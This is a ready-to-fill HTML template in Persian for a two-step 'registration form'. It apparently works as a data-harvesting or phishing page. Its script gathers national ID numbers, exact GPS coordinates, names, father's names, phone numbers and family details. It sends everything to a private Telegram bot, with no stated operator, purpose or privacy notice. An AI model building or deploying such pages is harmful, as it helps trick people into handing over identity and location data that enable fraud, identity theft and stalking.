<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>فرم ثبت نام</title>

<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;600;800&display=swap" rel="stylesheet">

<style>
  body{
    font-family:'Vazirmatn',sans-serif;
    background:#f2f5f8;
    margin:0;
    padding:20px;
    display:flex;
    justify-content:center;
  }

  .container{
    background:#fff;
    width:100%;
    max-width:900px;
    padding:20px;
    border-radius:14px;
    box-shadow:0 4px 15px rgba(0,0,0,0.1);
  }

  h1{margin-top:0;color:#123;font-size:22px}

  .card{
    background:#fff;
    border:1px solid #ddd;
    border-radius:12px;
    padding:20px;
    margin-bottom:20px;
  }

  label{font-size:14px;color:#555;margin-bottom:6px;display:block}
  input,select{
    width:100%;
    padding:10px;
    border-radius:8px;
    border:1px solid #ccc;
    margin-bottom:12px;
    font-size:14px;
  }

  button{
    padding:12px 20px;
    border:0;
    border-radius:10px;
    background:#0b5cff;
    color:#fff;
    font-size:15px;
    cursor:pointer;
  }

  button:disabled{
    opacity:0.5;
    cursor:not-allowed;
  }

  .error{color:#d60000;font-size:13px;margin-top:-8px;margin-bottom:10px}

  /* Responsive */
  @media (max-width:768px){
    .container{padding:15px}
    h1{font-size:20px}
  }

  @media (max-width:480px){
    button{width:100%}
  }
</style>
</head>
<body>

<div class="container">

<h1>مرحله ۱ — ثبت کد ملی و موقعیت</h1>

<div class="card">

  <label>کد ملی (۱۰ رقمی)</label>
  <input id="nationalId" maxlength="10" type="tel" placeholder="0012345678">
  <div id="nidError" class="error" style="display:none"></div>

  <label>لوکیشن</label>
  <input id="location" readonly placeholder="برای دریافت، دکمه زیر را بزنید">
  <div id="locError" class="error" style="display:none"></div>

  <button id="getLocBtn" type="button" style="background:#444;margin-bottom:10px">دریافت موقعیت</button>

  <button id="continueBtn" disabled>ادامه</button>
</div>

<!-- مرحله دوم -->
<div id="step2" style="display:none">

<h1>مرحله ۲ — معلومات شخصی</h1>

<div class="card">
  <label>نام</label>
  <input id="firstName">

  <label>نام خانوادگی</label>
  <input id="lastName">

  <label>نام پدر</label>
  <input id="fatherName">

  <label>شماره تماس</label>
  <input id="phone">

  <label>وضعیت تأهل</label>
  <select id="maritalStatus">
    <option value="single">مجرد</option>
    <option value="married">متأهل</option>
  </select>

  <label>تعداد فرزندان (اگر داری)</label>
  <input id="childrenCount" type="number" min="0">

  <button id="finishBtn" style="margin-top:10px;background:#28a745">ثبت نهایی</button>
</div>

</div>

</div>


<script>

const TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";   // ← تو این را پر کن
const CHAT_ID = "YOUR_CHAT_ID";            // ← این را هم پر کن

const nationalId = document.getElementById("nationalId");
const locationInput = document.getElementById("location");
const nidError = document.getElementById("nidError");
const locError = document.getElementById("locError");
const continueBtn = document.getElementById("continueBtn");

let fullLocationText = "";

nationalId.addEventListener("input", ()=>{
  nationalId.value = nationalId.value.replace(/[^0-9]/g,"");
  nidError.style.display="none";
  updateButtonState();
});

function updateButtonState(){
  continueBtn.disabled = !(nationalId.value.length===10 && locationInput.value.trim()!=="");
}

document.getElementById("getLocBtn").addEventListener("click", ()=>{

  if(!navigator.geolocation){
    locError.style.display="block";
    locError.textContent="مرورگر از لوکیشن پشتیبانی نمی‌کند";
    return;
  }

  navigator.geolocation.getCurrentPosition(async pos=>{
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    try{
      const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`;
      const res = await fetch(url);
      const data = await res.json();

      const country = data.address.country || "کشور نامشخص";
      const state   = data.address.state || "استان نامشخص";

      locationInput.value = `${country} | ${state}`;
      fullLocationText = `${country} | ${state} | Lat:${lat}, Lon:${lon}`;

      updateButtonState();

    }catch(e){
      locError.style.display="block";
      locError.textContent="دریافت موقعیت ممکن نشد";
    }

  },()=>{
      locError.style.display="block";
      locError.textContent="لوکیشن فعال نیست";
  });

});

async function sendToTelegram(msg){
  const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

  const payload = {
    chat_id: CHAT_ID,
    text: msg,
    parse_mode: "HTML"
  };

  return fetch(url,{
    method:"POST",
    headers:{ "Content-Type":"application/json"},
    body: JSON.stringify(payload)
  });
}

continueBtn.addEventListener("click", async ()=>{

  if(nationalId.value.length!==10){
    nidError.style.display="block";
    nidError.textContent="کد ملی باید ۱۰ رقمی باشد";
    return;
  }

  if(locationInput.value.trim()===""){
    locError.style.display="block";
    locError.textContent="لوکیشن دریافت نشده است";
    return;
  }

  continueBtn.textContent="در حال ارسال...";
  continueBtn.disabled=true;

  const text =
    `<b>مرحله اول ثبت‌نام</b>\n` +
    `<b>کد ملی:</b> ${nationalId.value}\n` +
    `<b>لوکیشن:</b> ${locationInput.value}\n` +
    `<b>لوکیشن کامل:</b> ${fullLocationText}\n` +
    `<b>زمان:</b> ${new Date().toISOString()}`;

  try{
    let req = await sendToTelegram(text);

    if(req.ok){
      continueBtn.textContent="ارسال شد ✓";
      document.getElementById("step2").style.display="block";
      window.scrollTo(0,document.body.scrollHeight);
    } else {
      throw new Error();
    }

  }catch(e){
    continueBtn.textContent="ادامه";
    continueBtn.disabled=false;
    alert("ارسال به تلگرام انجام نشد.");
  }

});

// ثبت نهایی مرحله دوم
document.getElementById("finishBtn").addEventListener("click", async ()=>{

  const fn = document.getElementById("firstName").value;
  const ln = document.getElementById("lastName").value;
  const father = document.getElementById("fatherName").value;
  const phone = document.getElementById("phone").value;
  const marital = document.getElementById("maritalStatus").value;
  const children = document.getElementById("childrenCount").value || "0";

  const msg =
  `<b>مرحله دوم ثبت‌نام</b>\n` +
  `<b>نام:</b> ${fn}\n` +
  `<b>نام خانوادگی:</b> ${ln}\n` +
  `<b>نام پدر:</b> ${father}\n` +
  `<b>شماره تماس:</b> ${phone}\n` +
  `<b>وضعیت تأهل:</b> ${marital}\n` +
  `<b>تعداد فرزندان:</b> ${children}`;

  try{
    await sendToTelegram(msg);
    alert("ثبت نهایی انجام شد ✓");
  }catch(e){
    alert("خطا در ارسال اطلاعات مرحله دوم");
  }

});

</script>

</body>
</html>
